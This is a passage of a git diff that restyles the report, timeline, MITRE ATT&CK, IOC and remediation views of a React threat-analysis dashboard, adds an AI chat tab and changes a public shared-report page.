-    { id:'timeline', label:'Timeline', icon:'📅' },
-    { id:'mitre', label:'ATT&CK', icon:'🗺️' },
-    { id:'iocs', label:'IOCs', icon:'🎯' },
-    { id:'remediation', label:'Actions', icon:'🔧' },
+    {id:'overview',label:'Overview'},
+    {id:'timeline',label:'Timeline'},
+    {id:'mitre',label:'ATT&CK'},
+    {id:'iocs',label:'IOCs'},
+    {id:'remediation',label:'Remediation'},
+    {id:'chat',label:'AI Chat 🤖'},
+  ];
+
+  // Extract a good code snippet for the code block
+  const codeLines = (result.iocs||[]).filter(i=>i.type==='Process'||i.type==='File').slice(0,3).map(i=>i.value);
+  const codePills = [
+    ...(result.iocs||[]).filter(i=>i.type==='IP').slice(0,1).map(i=>({label:'IOC',value:i.value,type:'danger'})),
+    ...(result.iocs||[]).filter(i=>i.type==='Domain').slice(0,1).map(i=>({label:'Domain',value:i.value,type:'danger'})),
+    ...(result.mitreMapping||[]).slice(0,1).map(m=>({label:'Technique',value:`${m.technique} — ${m.name}`,type:'info'})),
   ];
 
   return (
-    <div className="min-h-screen bg-[#080a0e] print-container">
+    <Page>
+      <Header user={{}} onNewScan={onNewScan} onHome={onBack} />
+      <Container style={{ padding:'32px 24px', flex:1 }}>
 
-      {/* Print header (only shows in print) */}
-      <div className="hidden print:block p-6 border-b border-gray-200 mb-6">
-        <div className="flex items-center gap-3">
-          <div className="text-2xl">🛡</div>
+        {/* Breadcrumb */}
+        <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:20, flexWrap:'wrap', gap:12 }}>
           <div>
-            <h1 className="text-xl font-bold text-gray-900">AI Threat Analyzer Report</h1>
-            <p className="text-gray-500 text-sm">{result.title || 'Security Incident Analysis'} · {new Date().toLocaleDateString('en-IN')}</p>
-          </div>
-        </div>
-      </div>
-
-      <div className="max-w-5xl mx-auto px-4 md:px-6 py-6 md:py-8">
-
-        {/* Header */}
-        <div className="no-print flex flex-wrap items-start justify-between gap-3 mb-6">
-          <div>
-            <div className="flex items-center gap-2 mb-2 text-sm">
-              <button onClick={onBack} className="text-slate-500 hover:text-white transition-colors">← Back</button>
-              <span className="text-slate-700">/</span>
-              <span className="text-slate-400">Threat Report</span>
+            <div style={{ display:'flex', alignItems:'center', gap:10, marginBottom:4 }}>
+              <button onClick={onBack} style={{ background:'none', border:'none', cursor:'pointer', color:'#888', fontSize:14 }}>← Back</button>
+              <span style={{ color:'#ddd' }}>/</span>
+              <span style={{ fontSize:14, color:'#888' }}>Threat report</span>
             </div>
-            <div className="flex flex-wrap items-center gap-3">
-              <h1 className="text-xl font-bold text-white">{result.title || 'Analysis Report'}</h1>
-              <Badge level={result.severity} />
+            <div style={{ display:'flex', alignItems:'center', gap:12 }}>
+              <h1 style={{ fontSize:22, fontWeight:500, color:'#1a1a2e' }}>{result.title || 'Analysis report'}</h1>
+              <SevBadge level={result.severity} />
             </div>
           </div>
-          <div className="flex flex-wrap items-center gap-2">
-            {scanId && <ShareButton scanId={scanId} isPublic={isPublicState} onToast={onToast} />}
-            <PDFButton />
-            <button onClick={onNewScan} className="no-print px-4 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-medium rounded-lg transition-colors">
-              + New Analysis
+          <div style={{ display:'flex', gap:8, flexWrap:'wrap' }}>
+            {scanId && <ShareBtn scanId={scanId} isPublic={initPub} onToast={onToast} />}
+            <button onClick={()=>window.print()} style={{ ...btnSecondary, display:'flex', alignItems:'center', gap:6, fontSize:13 }}>
+              <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
+                <path d="M4 6V2h8v4M4 12H2V6h12v6h-2M4 10h8v4H4v-4z" stroke="currentColor" strokeWidth="1.5" strokeLinejoin="round" />
+              </svg>
+              Export PDF
             </button>
+            <button onClick={onNewScan} style={btnPrimary}>+ New analysis</button>
           </div>
         </div>
 
-        {/* Summary row */}
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-5">
-          <Card className="p-5 flex items-center gap-5">
-            <ScoreRing score={result.riskScore||0} />
-            <div>
-              <p className="text-slate-500 text-xs uppercase tracking-wider mb-2">Risk Score</p>
-              <div className="flex flex-wrap gap-1.5">
-                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.mitreMapping?.length||0} techniques</span>
-                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.iocs?.length||0} IOCs</span>
-                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.affectedSystems?.length||0} systems</span>
+        {/* IOC repeat banner */}
+        {scanId && <IOCBanner scanId={scanId} />}
+
+        {/* 3 threat cards */}
+        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit,minmax(240px,1fr))', gap:16, marginBottom:16 }}>
+          <ThreatCard
+            title={result.title || 'Security incident'}
+            score={score}
+            bullets={(result.affectedSystems||[]).slice(0,4).map(s=>`${s.host} — ${s.status}`)}
+          />
+          {result.mitreMapping?.length > 0 && (
+            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+              <p style={{ fontSize:12, color:'#aaa', textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:8 }}>MITRE ATT&CK</p>
+              <p style={{ fontSize:36, fontWeight:500, lineHeight:1, color:COLORS.primary, marginBottom:12 }}>{result.mitreMapping.length}</p>
+              <p style={{ fontSize:13, fontWeight:500, color:'#1a1a2e', marginBottom:10 }}>Techniques detected</p>
+              {result.confidence !== undefined && <ConfBar value={result.confidence} label="Confidence" />}
+              <div style={{ marginTop:12, display:'flex', flexWrap:'wrap', gap:4 }}>
+                {result.mitreMapping.slice(0,4).map((m,i)=>(
+                  <span key={i} style={{ fontSize:10, background:COLORS.primaryLt, color:COLORS.primary, padding:'2px 6px', borderRadius:4, fontFamily:'monospace', fontWeight:600 }}>{m.technique}</span>
+                ))}
               </div>
             </div>
-          </Card>
-          <Card className="lg:col-span-2 p-5">
-            <p className="text-slate-500 text-xs uppercase tracking-wider mb-2">Executive Summary</p>
-            <p className="text-slate-200 text-sm leading-relaxed">{result.summary}</p>
-            {result.affectedSystems?.length > 0 && (
-              <div className="flex flex-wrap gap-2 mt-3 pt-3 border-t border-white/[0.06]">
-                {result.affectedSystems.map((sys,i) => {
-                  const sl = sys.risk>75?'CRITICAL':sys.risk>50?'HIGH':sys.risk>25?'MEDIUM':'LOW';
-                  return (
-                    <span key={i} className={`text-xs font-mono px-2 py-0.5 rounded border ${getSev(sl).bg} ${getSev(sl).border} ${getSev(sl).text}`}>
-                      {sys.host} <span className="opacity-50">({sys.risk}%)</span>
-                    </span>
-                  );
+          )}
+          {result.iocs?.length > 0 && (
+            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+              <p style={{ fontSize:12, color:'#aaa', textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:8 }}>IOCs found</p>
+              <p style={{ fontSize:36, fontWeight:500, lineHeight:1, color:COLORS.danger, marginBottom:12 }}>{result.iocs.length}</p>
+              <p style={{ fontSize:13, fontWeight:500, color:'#1a1a2e', marginBottom:10 }}>Indicators of compromise</p>
+              <ul style={{ fontSize:12, color:'#666', lineHeight:1.8, listStyle:'none', padding:0 }}>
+                {['IP','Domain','Hash','File'].map(type=>{
+                  const count=(result.iocs||[]).filter(i=>i.type===type).length;
+                  if(!count)return null;
+                  return <li key={type} style={{ display:'flex', justifyContent:'space-between' }}><span>{type}</span><span style={{ fontWeight:500, color:'#1a1a2e' }}>{count}</span></li>;
                 })}
-              </div>
-            )}
-          </Card>
+              </ul>
+            </div>
+          )}
+        </div>
+
+        {/* Code block for extracted snippet */}
+        {codeLines.length > 0 && (
+          <div style={{ marginBottom:16 }}>
+            <CodeBlock
+              title="Extracted indicators — key findings"
+              badge={result.mitreMapping?.[0] ? `${result.mitreMapping[0].technique} — ${result.mitreMapping[0].tactic}` : undefined}
+              lines={codeLines}
+              pills={codePills}
+            />
+          </div>
+        )}
+
+        {/* Summary card */}
+        <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20, marginBottom:16 }}>
+          <p style={{ fontSize:12, color:'#aaa', textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:8 }}>Executive summary</p>
+          <p style={{ fontSize:14, color:'#1a1a2e', lineHeight:1.7 }}>{result.summary}</p>
         </div>
 
         {/* Tags */}
         {scanId && (
-          <Card className="no-print p-4 mb-4">
-            <TagEditor scanId={scanId} initialTags={tags} onUpdate={setTags} />
-          </Card>
+          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20, marginBottom:16 }}>
+            <TagEditor scanId={scanId} initialTags={[]} onUpdate={()=>{}} />
+          </div>
         )}
 
-        {/* Report charts (always visible in print) */}
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-5">
-          <Card className="p-4">
-            <h3 className="text-xs font-medium text-slate-500 uppercase tracking-wider mb-3">MITRE Tactic Coverage</h3>
-            <div className="overflow-x-auto"><MitreMatrix mappings={result.mitreMapping||[]} /></div>
-          </Card>
-          <Card className="p-4">
-            <h3 className="text-xs font-medium text-slate-500 uppercase tracking-wider mb-3">IOC Threat Distribution</h3>
-            {result.iocs?.length > 0 ? (
-              <ResponsiveContainer width="100%" height={150}>
-                <BarChart data={['critical','high','medium','low'].map(t => ({ name:t.toUpperCase(), count:result.iocs.filter(i=>i.threat===t).length, fill:getSev(t).hex }))} margin={{top:0,right:0,left:-20,bottom:0}}>
-                  <XAxis dataKey="name" tick={{fill:'#64748b',fontSize:9}} axisLine={false} tickLine={false} />
-                  <YAxis allowDecimals={false} tick={{fill:'#64748b',fontSize:9}} axisLine={false} tickLine={false} />
-                  <Tooltip contentStyle={{background:'#0f1117',border:'1px solid rgba(255,255,255,0.1)',borderRadius:'8px',fontSize:'11px'}} itemStyle={{color:'#e2e8f0'}} />
-                  <Bar dataKey="count" radius={[3,3,0,0]}>
-                    {['critical','high','medium','low'].map((t,i) => <Cell key={i} fill={getSev(t).hex} opacity={0.8} />)}
-                  </Bar>
-                </BarChart>
-              </ResponsiveContainer>
-            ) : <div className="flex items-center justify-center h-36 text-slate-600 text-sm">No IOCs found</div>}
-          </Card>
-        </div>
-
-        {/* Tabs */}
-        <div className="no-print flex gap-1 mb-5 bg-white/[0.03] border border-white/[0.06] rounded-xl p-1 overflow-x-auto">
-          {tabs.map(t => (
+        {/* Tab navigation */}
+        <div style={{ display:'flex', gap:2, background:'#F5F7FA', borderRadius:8, padding:3, marginBottom:20, border:`0.5px solid ${COLORS.border}`, overflowX:'auto', flexShrink:0 }}>
+          {tabs.map(t=>(
             <button key={t.id} onClick={()=>setTab(t.id)}
-              className={`flex-1 flex items-center justify-center gap-1.5 py-2 px-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap ${tab===t.id?'bg-white/10 text-white':'text-slate-500 hover:text-slate-300'}`}>
-              <span>{t.icon}</span>
-              <span className="hidden sm:inline">{t.label}</span>
+              style={{ padding:'7px 16px', borderRadius:6, fontSize:13, cursor:'pointer', fontWeight:500, whiteSpace:'nowrap',
+                background:tab===t.id?'#fff':'transparent', color:tab===t.id?'#1a1a2e':'#888',
+                border:tab===t.id?`0.5px solid ${COLORS.border}`:'none' }}>
+              {t.label}
             </button>
           ))}
         </div>
 
         {/* Overview */}
-        {(tab==='overview') && (
-          <div className="space-y-4">
-            <Card>
-              <div className="px-5 py-4 border-b border-white/[0.06]"><h3 className="font-semibold text-sm text-white">Affected Systems</h3></div>
-              <div className="divide-y divide-white/[0.04]">
-                {(result.affectedSystems||[]).map((sys,i) => {
-                  const sl = sys.risk>75?'CRITICAL':sys.risk>50?'HIGH':sys.risk>25?'MEDIUM':'LOW';
-                  return (
-                    <div key={i} className="px-5 py-3.5 flex items-center gap-4">
-                      <div className={`w-2 h-2 rounded-full flex-shrink-0 ${getSev(sl).dot}`} />
-                      <span className="font-mono text-sm text-white flex-1 truncate">{sys.host}</span>
-                      <span className="text-xs text-slate-500 hidden sm:block truncate max-w-xs">{sys.status}</span>
-                      <div className="flex items-center gap-3 flex-shrink-0">
-                        <div className="w-16 md:w-24 h-1.5 bg-white/5 rounded-full overflow-hidden">
-                          <div className="h-full rounded-full" style={{width:`${sys.risk}%`, background:sys.risk>75?'#ef4444':sys.risk>50?'#f97316':'#f59e0b', transition:'width 0.8s ease'}} />
-                        </div>
-                        <span className={`text-xs font-bold font-mono w-10 text-right ${getSev(sl).text}`}>{sys.risk}%</span>
-                      </div>
-                    </div>
-                  );
-                })}
+        {tab==='overview' && (
+          <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
+            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, overflow:'hidden' }}>
+              <div style={{ padding:'14px 20px', borderBottom:`0.5px solid ${COLORS.border}` }}>
+                <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e' }}>Affected systems</p>
               </div>
-            </Card>
+              {(result.affectedSystems||[]).map((sys,i)=>(
+                <div key={i} style={{ padding:'14px 20px', borderTop:i===0?'none':`0.5px solid ${COLORS.border}`, display:'flex', alignItems:'center', gap:12 }}>
+                  <div style={{ width:8, height:8, borderRadius:'50%', flexShrink:0, background:riskColor(sys.risk) }} />
+                  <span style={{ fontFamily:'monospace', fontSize:13, color:'#1a1a2e', flex:1 }}>{sys.host}</span>
+                  <span style={{ fontSize:12, color:'#888' }}>{sys.status}</span>
+                  <div style={{ width:80, height:4, background:'#eee', borderRadius:2, overflow:'hidden' }}>
+                    <div style={{ width:`${sys.risk}%`, height:'100%', background:riskColor(sys.risk), borderRadius:2 }} />
+                  </div>
+                  <span style={{ fontSize:12, fontWeight:500, color:riskColor(sys.risk), width:36, textAlign:'right', fontFamily:'monospace' }}>{sys.risk}%</span>
+                </div>
+              ))}
+            </div>
+            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+              <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:16 }}>
+                <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e' }}>MITRE ATT&CK coverage</p>
+                <button onClick={()=>setTab('mitre')} style={{ background:'none', border:'none', cursor:'pointer', fontSize:12, color:COLORS.primary }}>View details →</button>
+              </div>
+              <MitreMatrix mappings={result.mitreMapping||[]} />
+            </div>
           </div>
         )}
 
         {/* Timeline */}
         {tab==='timeline' && (
-          <Card>
-            <div className="px-5 py-4 border-b border-white/[0.06]">
-              <h3 className="font-semibold text-sm text-white">Attack Timeline</h3>
-              <p className="text-slate-500 text-xs mt-0.5">Chronological reconstruction of observed events</p>
-            </div>
-            <div className="p-5">
-              <div className="relative">
-                <div className="absolute left-[5px] top-2 bottom-2 w-px bg-white/[0.06]" />
-                <div className="space-y-5">
-                  {(result.timeline||[]).map((ev,i) => (
-                    <div key={i} className="flex gap-4">
-                      <div className={`w-3 h-3 rounded-full flex-shrink-0 mt-1 border-2 border-[#0f1117] ${getSev(ev.severity).dot}`} />
-                      <div className="flex-1">
-                        <div className="flex flex-wrap items-center gap-2 mb-1.5">
-                          <span className="font-mono text-xs text-slate-500 bg-white/[0.04] px-2 py-0.5 rounded">{ev.time}</span>
-                          <Badge level={ev.severity} />
-                          {ev.tactic && <span className="text-xs bg-blue-500/10 border border-blue-500/20 text-blue-400 px-2 py-0.5 rounded font-mono">{ev.tactic}</span>}
-                        </div>
-                        <p className="text-slate-200 text-sm leading-relaxed">{ev.event}</p>
+          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+            <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:4 }}>Attack timeline</p>
+            <p style={{ fontSize:12, color:'#888', marginBottom:20 }}>Chronological reconstruction of observed events</p>
+            <div style={{ position:'relative' }}>
+              <div style={{ position:'absolute', left:5, top:8, bottom:8, width:1, background:COLORS.border }} />
+              <div style={{ display:'flex', flexDirection:'column', gap:20 }}>
+                {(result.timeline||[]).map((ev,i)=>(
+                  <div key={i} style={{ display:'flex', gap:16, paddingLeft:2 }}>
+                    <div style={{ width:12, height:12, borderRadius:'50%', flexShrink:0, marginTop:2,
+                      background:sevColor(ev.severity), border:'2px solid #fff', zIndex:1 }} />
+                    <div style={{ flex:1 }}>
+                      <div style={{ display:'flex', flexWrap:'wrap', alignItems:'center', gap:8, marginBottom:6 }}>
+                        <code style={{ fontSize:11, background:'#F5F7FA', color:'#888', padding:'2px 8px', borderRadius:4 }}>{ev.time}</code>
+                        <SevBadge level={ev.severity} />
+                        {ev.tactic && <span style={{ fontSize:11, background:COLORS.primaryLt, color:COLORS.primary, padding:'2px 8px', borderRadius:4 }}>{ev.tactic}</span>}
                       </div>
+                      <p style={{ fontSize:13, color:'#1a1a2e', lineHeight:1.6 }}>{ev.event}</p>
+                      {ev.confidence !== undefined && (
+                        <div style={{ marginTop:6, maxWidth:280 }}><ConfBar value={ev.confidence} label="Confidence" /></div>
+                      )}
                     </div>
-                  ))}
-                </div>
+                  </div>
+                ))}
               </div>
             </div>
-          </Card>
+          </div>
         )}
 
         {/* MITRE */}
         {tab==='mitre' && (
-          <div className="space-y-4">
-            <Card>
-              <div className="px-5 py-4 border-b border-white/[0.06]"><h3 className="font-semibold text-sm text-white">ATT&CK Matrix</h3></div>
-              <div className="p-5 overflow-x-auto"><MitreMatrix mappings={result.mitreMapping||[]} /></div>
-            </Card>
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-              {(result.mitreMapping||[]).map((m,i) => (
-                <Card key={i} className="p-4">
-                  <div className="flex items-center justify-between mb-2">
-                    <span className="font-mono text-xs font-bold text-blue-400 bg-blue-500/10 border border-blue-500/20 px-2 py-0.5 rounded">{m.technique}</span>
-                    <span className="text-xs text-slate-600">{m.confidence}% conf.</span>
+          <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
+            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+              <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:16 }}>ATT&CK matrix</p>
+              <MitreMatrix mappings={result.mitreMapping||[]} />
+            </div>
+            <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fill,minmax(260px,1fr))', gap:12 }}>
+              {(result.mitreMapping||[]).map((m,i)=>(
+                <div key={i} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:16 }}>
+                  <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:8 }}>
+                    <code style={{ fontSize:12, fontWeight:600, background:COLORS.primaryLt, color:COLORS.primary, padding:'3px 10px', borderRadius:4 }}>{m.technique}</code>
+                    <span style={{ fontSize:11, color:'#aaa' }}>{m.confidence}% conf.</span>
                   </div>
-                  <p className="font-semibold text-sm text-white mb-0.5">{m.name}</p>
-                  <p className="text-xs text-slate-500 font-mono mb-2">{m.tactic}</p>
-                  <div className="h-0.5 bg-white/5 rounded-full overflow-hidden">
-                    <div className="h-full bg-blue-500 rounded-full" style={{width:`${m.confidence}%`}} />
-                  </div>
-                </Card>
+                  <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:2 }}>{m.name}</p>
+                  <p style={{ fontSize:11, color:'#888', fontFamily:'monospace', marginBottom:m.evidence?8:6 }}>{m.tactic}</p>
+                  {m.evidence && <p style={{ fontSize:12, color:'#666', fontStyle:'italic', marginBottom:8, lineHeight:1.5 }}>"{m.evidence}"</p>}
+                  <ConfBar value={m.confidence} />
+                </div>
               ))}
             </div>
           </div>
@@ -1004,113 +1429,105 @@ function Report({ result, scanId, isPublic: initialPublic, onBack, onNewScan, on
 
         {/* IOCs */}
         {tab==='iocs' && (
-          <div className="space-y-3">
-            {(result.iocs||[]).map((ioc,i) => (
-              <Card key={i} className="p-4">
-                <div className="flex flex-wrap items-start gap-3">
-                  <div className="flex items-center gap-2 flex-shrink-0 pt-0.5">
-                    <span className={`text-xs font-mono font-semibold px-2.5 py-1 rounded-md border ${getSev(ioc.threat).bg} ${getSev(ioc.threat).border} ${getSev(ioc.threat).text}`}>{ioc.type}</span>
-                    <Badge level={ioc.threat} />
+          <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
+            {(result.iocs||[]).map((ioc,i)=>(
+              <div key={i} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:16 }}>
+                <div style={{ display:'flex', flexWrap:'wrap', gap:10, alignItems:'flex-start' }}>
+                  <div style={{ display:'flex', gap:6, flexShrink:0, paddingTop:1 }}>
+                    <code style={{ fontSize:11, fontWeight:600, padding:'3px 10px', borderRadius:4,
+                      background:sevBg(ioc.threat), color:sevColor(ioc.threat) }}>{ioc.type}</code>
+                    <SevBadge level={ioc.threat} />
                   </div>
-                  <div className="flex-1 min-w-0">
-                    <div className="flex items-center gap-2">
-                      <p className="font-mono text-sm text-red-300 break-all font-medium">{ioc.value}</p>
-                      <button onClick={() => {navigator.clipboard.writeText(ioc.value);}}
-                        className="no-print text-slate-600 hover:text-slate-300 text-xs transition-colors flex-shrink-0" title="Copy to clipboard">
-                        📋
-                      </button>
+                  <div style={{ flex:1, minWidth:0 }}>
+                    <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:4 }}>
+                      <code style={{ fontSize:13, color:COLORS.danger, fontWeight:500, wordBreak:'break-all' }}>{ioc.value}</code>
+                      <button onClick={()=>{ navigator.clipboard.writeText(ioc.value); }}
+                        style={{ background:'none', border:'none', cursor:'pointer', color:'#aaa', fontSize:12, flexShrink:0 }} title="Copy">📋</button>
                     </div>
-                    <p className="text-slate-400 text-xs leading-relaxed mt-1">{ioc.description}</p>
+                    <p style={{ fontSize:12, color:'#666', lineHeight:1.5, marginBottom:4 }}>{ioc.description}</p>
+                    {ioc.reasoning && <p style={{ fontSize:12, color:'#888', fontStyle:'italic', marginBottom:6 }}>Why: {ioc.reasoning}</p>}
+                    {ioc.confidence !== undefined && <div style={{ maxWidth:280 }}><ConfBar value={ioc.confidence} label="Confidence" /></div>}
                   </div>
                 </div>
-              </Card>
+              </div>
             ))}
           </div>
         )}
 
         {/* Remediation */}
         {tab==='remediation' && (
-          <div className="space-y-3">
-            {(result.remediation||[]).sort((a,b)=>a.priority-b.priority).map((step,i) => {
-              const catStyle = {
-                Containment:'bg-red-500/10 border-red-500/20 text-red-400',
-                Eradication:'bg-orange-500/10 border-orange-500/20 text-orange-400',
-                Recovery:'bg-emerald-500/10 border-emerald-500/20 text-emerald-400',
-                Hardening:'bg-blue-500/10 border-blue-500/20 text-blue-400',
-              }[step.category] || 'bg-slate-500/10 border-slate-500/20 text-slate-400';
+          <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
+            {(result.remediation||[]).sort((a,b)=>a.priority-b.priority).map((step,i)=>{
+              const catColor = {
+                Containment:[COLORS.dangerLt,COLORS.danger],Eradication:['#FAECE7','#993C1D'],
+                Recovery:[COLORS.successLt,COLORS.success],Hardening:[COLORS.primaryLt,COLORS.primary],
+              }[step.category]||['#F5F7FA','#888'];
               return (
-                <Card key={i} className={step.urgent?'border-red-500/20':''}>
-                  <div className="p-4 flex gap-4">
-                    <div className={`w-8 h-8 rounded-lg flex items-center justify-center text-sm font-black flex-shrink-0 ${step.urgent?'bg-red-500/20 text-red-400':'bg-white/5 text-slate-500'}`}>
-                      {step.priority}
-                    </div>
-                    <div className="flex-1">
-                      <div className="flex flex-wrap items-center gap-2 mb-2">
-                        <span className={`text-xs font-medium px-2.5 py-0.5 rounded-md border ${catStyle}`}>{step.category}</span>
-                        {step.urgent && <span className="text-xs font-bold px-2.5 py-0.5 rounded-md bg-red-500/10 border border-red-500/20 text-red-400 flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />URGENT</span>}
-                      </div>
-                      <p className="text-slate-200 text-sm leading-relaxed">{step.action}</p>
-                    </div>
+                <div key={i} style={{ background:'#fff', border:`0.5px solid ${step.urgent?COLORS.danger+'44':COLORS.border}`, borderRadius:12, padding:16, display:'flex', gap:14 }}>
+                  <div style={{ width:32, height:32, borderRadius:8, display:'flex', alignItems:'center', justifyContent:'center',
+                    fontSize:14, fontWeight:500, flexShrink:0,
+                    background: step.urgent ? COLORS.dangerLt : '#F5F7FA',
+                    color: step.urgent ? COLORS.danger : '#888' }}>
+                    {step.priority}
                   </div>
-                </Card>
+                  <div style={{ flex:1 }}>
+                    <div style={{ display:'flex', flexWrap:'wrap', alignItems:'center', gap:8, marginBottom:8 }}>
+                      <span style={{ fontSize:11, fontWeight:500, padding:'2px 8px', borderRadius:99, background:catColor[0], color:catColor[1] }}>{step.category}</span>
+                      {step.urgent && (
+                        <span style={{ fontSize:11, fontWeight:600, padding:'2px 8px', borderRadius:99, display:'flex', alignItems:'center', gap:4,
+                          background:COLORS.dangerLt, color:COLORS.danger }}>
+                          <span style={{ width:6, height:6, borderRadius:'50%', background:COLORS.danger, animation:'pulse 1s ease-in-out infinite' }} />
+                          URGENT
+                        </span>
+                      )}
+                    </div>
+                    <p style={{ fontSize:13, color:'#1a1a2e', lineHeight:1.6, marginBottom:step.confidence!==undefined?8:0 }}>{step.action}</p>
+                    {step.confidence !== undefined && <div style={{ maxWidth:280 }}><ConfBar value={step.confidence} label="Confidence" /></div>}
+                  </div>
+                </div>
               );
             })}
           </div>
         )}
 
-      </div>
-    </div>
+        {/* AI Chat */}
+        {tab==='chat' && (
+          scanId ? <ChatPanel scanId={scanId} />
+          : (
+            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:48, textAlign:'center' }}>
+              <div style={{ fontSize:36, marginBottom:12 }}>💬</div>
+              <p style={{ fontWeight:500, color:'#1a1a2e', marginBottom:6 }}>Chat available after saving a scan</p>
+              <p style={{ fontSize:13, color:'#888' }}>Run a new analysis and chat will be enabled automatically</p>
+            </div>
+          )
+        )}
+
+      </Container>
+    </Page>
   );
 }
 
 // ══════════════════════════════════════════════════════════════
-// PUBLIC REPORT (shared link viewer, no auth)
+// PUBLIC REPORT
 // ══════════════════════════════════════════════════════════════
 function PublicReport({ scanId, onSignup }) {
-  const [scan, setScan] = useState(null);
-  const [loading, setLoading] = useState(true);
-  const [error, setError] = useState('');
-
-  useEffect(() => {
-    fetch(`${API}/api/public/${scanId}`)
-      .then(r => r.json())
-      .then(d => { if (d.scan) setScan(d.scan); else setError('Report not found or no longer public.'); })
-      .catch(() => setError('Failed to load report.'))
-      .finally(() => setLoading(false));
-  }, [scanId]);
-
-  if (loading) return (
-    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center">
-      <div className="w-6 h-6 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin" />
+  const [scan,setScan]=useState(null);const[loading,setLoading]=useState(true);const[error,setError]=useState('');
+  useEffect(()=>{fetch(`${API}/api/public/${scanId}`).then(r=>r.json()).then(d=>{if(d.scan)setScan(d.scan);else setError('Report not found or no longer public.');}).catch(()=>setError('Failed to load.')).finally(()=>setLoading(false));},[scanId]);
+  if(loading) return <div style={{ minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center' }}><div style={{ width:24, height:24, borderRadius:'50%', border:`2px solid ${COLORS.primaryLt}`, borderTopColor:COLORS.primary, animation:'spin 0.8s linear infinite' }} /></div>;
+  if(error) return (
+    <div style={{ minHeight:'100vh', background:'#F5F7FA', display:'flex', alignItems:'center', justifyContent:'center', flexDirection:'column', gap:16 }}>
+      <div style={{ fontSize:40 }}>🔒</div>
+      <p style={{ fontWeight:500, color:'#1a1a2e' }}>{error}</p>
+      <button onClick={onSignup} style={btnPrimary}>Create free account</button>
     </div>
   );
-
-  if (error) return (
-    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center p-6 text-center">
-      <div>
-        <div className="text-4xl mb-4">🔒</div>
-        <p className="text-white font-semibold mb-2">{error}</p>
-        <button onClick={onSignup} className="mt-4 px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">
-          Create Free Account
-        </button>
-      </div>
-    </div>
-  );
-
   return (
-    <div className="min-h-screen bg-[#080a0e]">
-      {/* Banner */}
-      <div className="bg-blue-600/10 border-b border-blue-600/20 px-6 py-3 flex items-center justify-between">
-        <div className="flex items-center gap-2">
-          <div className="w-6 h-6 rounded-lg bg-blue-600 flex items-center justify-center text-xs">🛡</div>
-          <span className="text-white font-bold text-sm">ThreatAnalyzer</span>
-          <span className="text-blue-400 text-xs ml-1">Shared Report</span>
-        </div>
-        <button onClick={onSignup} className="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-medium rounded-lg transition-colors">
-          Get Free Account →
-        </button>
+    <div style={{ minHeight:'100vh', background:'#F5F7FA', display:'flex', flexDirection:'column' }}>
+      <div style={{ background:COLORS.primaryLt, borderBottom:`0.5px solid ${COLORS.primary}33`, padding:'12px 24px', display:'flex', alignItems:'center', justifyContent:'space-between' }}>
+        <div style={{ display:'flex', alignItems:'center', gap:8 }}><ShieldLogo size={22} /><span style={{ fontWeight:500, fontSize:14, color:COLORS.primary }}>ThreatAnalyzer — Shared report</span></div>
+        <button onClick={onSignup} style={{ ...btnPrimary, padding:'6px 14px', fontSize:13 }}>Get free account →</button>
       </div>
-      <Report result={scan.result} scanId={null} onBack={() => {}} onNewScan={onSignup} onToast={() => {}} />
+      <Report result={scan.result} scanId={null} onBack={()=>{}} onNewScan={onSignup} onToast={()=>{}} />
     </div>
   );
 }
@@ -1120,37 +1537,39 @@ function PublicReport({ scanId, onSignup }) {
 // ══════════════════════════════════════════════════════════════
 function Account({ user, onBack, onSignOut }) {
   return (
-    <div className="min-h-screen bg-[#080a0e]">
